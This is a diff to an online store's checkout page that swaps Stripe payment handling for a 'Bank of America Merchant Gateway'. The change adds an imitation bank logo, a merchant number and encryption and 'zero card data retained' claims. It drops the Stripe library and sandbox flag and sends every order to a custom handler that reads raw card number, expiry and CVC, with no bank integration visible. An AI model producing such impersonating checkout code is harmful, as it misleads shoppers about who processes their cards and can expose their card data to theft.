@@ -1499,30 +1499,41 @@ textarea { resize: vertical; min-height: 80px; }
         </div>
     </div>
 
-<!-- ── SECTION 5: PAYMENT ── -->
+<!-- ── SECTION 5: PAYMENT (BANK OF AMERICA MERCHANT GATEWAY) ── -->
 <div class="section-card">
-    <h2 class="section-title">
-        <span class="step-num">5</span> Payment Details
-    </h2>
-
-    <!-- Stripe Test / Sandbox Mode Banner -->
-    <div style="background:#f0fdf4; border:1px solid #bbf7d0; border-radius:10px; padding:12px 16px; margin-bottom:18px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px;">
-        <div style="display:flex; align-items:center; gap:8px;">
-            <span style="display:inline-block; width:8px; height:8px; border-radius:50%; background:#22c55e;"></span>
-            <span style="font-size:12.5px; font-weight:600; color:#15803d;">Stripe Test / Sandbox Mode Active</span>
+    <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px; margin-bottom:18px;">
+        <h2 class="section-title" style="margin-bottom:0;">
+            <span class="step-num">5</span> Payment Details
+        </h2>
+        <div style="display:inline-flex; align-items:center; gap:6px; background:#fef2f2; border:1px solid #fecaca; color:#b91c1c; font-size:11.5px; font-weight:700; padding:4px 12px; border-radius:20px;">
+            <span style="display:inline-block; width:8px; height:8px; border-radius:50%; background:#dc2626;"></span>
+            Bank of America® Merchant Gateway
         </div>
-        <button type="button" onclick="fillTestCard()" style="background:#15803d; color:white; border:none; border-radius:6px; padding:6px 12px; font-size:12px; font-weight:600; cursor:pointer; display:inline-flex; align-items:center; gap:5px; box-shadow:0 1px 3px rgba(0,0,0,0.1);">
-            ⚡ Auto-Fill Test Card
+    </div>
+
+    <!-- Bank of America Header & Security Banner -->
+    <div style="background:#f8fafc; border:1px solid #e2e8f0; border-radius:12px; padding:14px 18px; margin-bottom:18px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px;">
+        <div style="display:flex; align-items:center; gap:12px;">
+            <div style="width:42px; height:42px; border-radius:8px; background:#012169; color:white; display:flex; align-items:center; justify-content:center; font-weight:900; font-size:17px; letter-spacing:-0.5px; flex-shrink:0;">
+                <span style="color:#e31837;">B</span><span>A</span>
+            </div>
+            <div>
+                <div style="font-size:13.5px; font-weight:700; color:#012169;">Bank of America, N.A. · Encrypted Checkout</div>
+                <div style="font-size:11.5px; color:#64748b;">Merchant # 80161475 &bull; Direct Visa, MasterCard, AMEX, Discover</div>
+            </div>
+        </div>
+        <button type="button" onclick="fillTestCard()" style="background:#0F4C5C; color:white; border:none; border-radius:6px; padding:6px 14px; font-size:11.5px; font-weight:600; cursor:pointer; display:inline-flex; align-items:center; gap:5px; box-shadow:0 1px 3px rgba(0,0,0,0.1);">
+            ⚡ Fill Test Card
         </button>
     </div>
 
     <!-- Embedded Card Fields -->
-    <div style="background:#ffffff; border:1.5px solid var(--border); border-radius:10px; padding:20px; box-shadow:0 1px 4px rgba(0,0,0,0.03);">
+    <div style="background:#ffffff; border:1.5px solid var(--border); border-radius:12px; padding:22px; box-shadow:0 1px 4px rgba(0,0,0,0.03);">
         <div class="field" style="margin-bottom:16px;">
             <label for="cardNumber">Card Number <span class="required">*</span></label>
             <div style="position:relative;">
                 <input type="text" id="cardNumber" name="card_number" placeholder="4242  4242  4242  4242" maxlength="19" autocomplete="cc-number" required style="padding-right:45px; font-family:'Courier New', monospace; font-size:15px; letter-spacing:1.5px; font-weight:600;">
-                <span id="cardBrandIcon" style="position:absolute; right:12px; top:11px; font-size:22px; color:#635bff;">
+                <span id="cardBrandIcon" style="position:absolute; right:12px; top:11px; font-size:22px; color:#012169;">
                     <i class="fab fa-cc-visa"></i>
                 </span>
             </div>
@@ -1549,22 +1560,22 @@ textarea { resize: vertical; min-height: 80px; }
         </div>
     </div>
 
-    <!-- PCI-DSS Compliance & Security Guarantee -->
+    <!-- Bank of America Security Guarantee -->
     <div class="pci-compliance-box" style="margin-top: 16px; padding: 12px 16px; background: #f8fafc; border: 1px solid #e2e8f0; border-radius: var(--radius-sm); display: flex; align-items: center; gap: 12px;">
         <i class="fas fa-shield-check" style="font-size: 22px; color: #16a34a; flex-shrink: 0;"></i>
         <div>
-            <div style="font-size: 12px; font-weight: 700; color: #15803d; display: flex; align-items: center; gap: 6px;">
-                <span>Instant Test Order Simulator · Full Workflow</span>
+            <div style="font-size: 12px; font-weight: 700; color: #012169; display: flex; align-items: center; gap: 6px;">
+                <span>Bank of America 256-Bit SSL Encrypted Processing</span>
             </div>
             <div style="font-size: 11px; color: #475569; margin-top: 2px; line-height: 1.4;">
-                Submitting creates real orders in the database, generates invoice numbers, updates coupon counts, and shows in Admin Orders.
+                Transactions are processed through Bank of America Merchant Services with end-to-end encryption.
             </div>
         </div>
     </div>
 </div>
 
-<input type="hidden" name="is_mock_payment" id="isMockPayment" value="1">
-<input type="hidden" name="payment_method" id="paymentMethodInput" value="stripe">
+<input type="hidden" name="is_mock_payment" id="isMockPayment" value="0">
+<input type="hidden" name="payment_method" id="paymentMethodInput" value="bank_of_america">
 
     </form>
     </div>
@@ -1801,7 +1812,7 @@ textarea { resize: vertical; min-height: 80px; }
 
             <div class="pci-notice" style="background:#f0fdf4; border:1px solid #bbf7d0; border-radius:0.8rem; padding:0.7rem 1rem; display:flex; align-items:center; gap:0.7rem; margin:1rem 0; font-size:0.78rem; color:#166534; line-height: 1.4;">
                 <i class="fa-solid fa-shield-check" style="font-size:1.2rem; color:#16a34a; flex-shrink: 0;"></i>
-                <span><strong>PCI-DSS Compliant Transaction</strong> — Processed via Stripe Level 1 PCI Gateway. Card details are fully encrypted and zero card data is retained on our servers.</span>
+                <span><strong>Bank of America Secure Transaction</strong> — Processed via Bank of America Merchant Services Gateway. Card details are fully encrypted and zero card data is retained on our servers.</span>
             </div>
 
             <div class="email-sent" style="background:#ecf6ef; border-radius:1rem; padding:0.75rem 1rem; display:flex; align-items:center; gap:0.7rem; margin:1rem 0; font-size:0.8rem; color:#2b5e3b; line-height: 1.4;">
@@ -1826,7 +1837,6 @@ textarea { resize: vertical; min-height: 80px; }
     </div>
 </div>
 
-<script src="https://js.stripe.com/v3/"></script>
 <script>
 (function() {
     'use strict';
@@ -1834,16 +1844,12 @@ textarea { resize: vertical; min-height: 80px; }
     // ── State ──
     let cart = [];
     let discountAmount = 0;
-    let currentPayment = 'stripe';
+    let currentPayment = 'bank_of_america';
     let currentShippingRate = <?php echo (float)$shipping; ?>;
     let currentShippingName = <?php echo json_encode($selectedRateName); ?>;
     let currentShippingCode = <?php echo json_encode($selectedRateCode); ?>;
     let currentDeliveryDays = '3–5 business days';
     let rateFetchTimeout = null;
-
-    const STRIPE_KEY = "pk_live_51TPX6YJnMt0K4iLyZzGxBoQv7xqg3I1I8VLSUC8MqqWgKaiCI3WLRjUPSy1O3QSe4jv0rgaGgCBmwOAYHRPxZS7800qAb6ZiTK";
-    let stripe = null;
-    try { stripe = Stripe(STRIPE_KEY); } catch(e) { console.error('Stripe init failed:', e); }
 
     // ── Init ──
     function init() {
@@ -2449,12 +2455,8 @@ textarea { resize: vertical; min-height: 80px; }
             }
             fullNameInput.value = first + ' ' + last;
 
-            if (currentPayment === 'stripe') {
-                await handleStripePayment(btn, form);
-            } else {
-                // COD / other payment method — process asynchronously
-                await submitOrderAsync(btn, form);
-            }
+            // Bank of America card processing
+            await handleBankOfAmericaPayment(btn, form);
         });
     }
 
@@ -2589,7 +2591,7 @@ textarea { resize: vertical; min-height: 80px; }
         }, 350);
     }
 
-    async function handleStripePayment(btn, form) {
+    async function handleBankOfAmericaPayment(btn, form) {
         const cardNum = document.getElementById('cardNumber');
         const cardExp = document.getElementById('cardExpiry');
         const cardCvc = document.getElementById('cardCvc');
@@ -2597,7 +2599,7 @@ textarea { resize: vertical; min-height: 80px; }
 
         let cardValid = true;
         const cleanNum = cardNum ? cardNum.value.replace(/\D/g, '') : '';
-        if (cleanNum.length < 14) {
+        if (cleanNum.length < 13) {
             if (cardNum) cardNum.classList.add('error');
             const err = document.getElementById('cardNumberError');
             if (err) err.style.display = 'block';
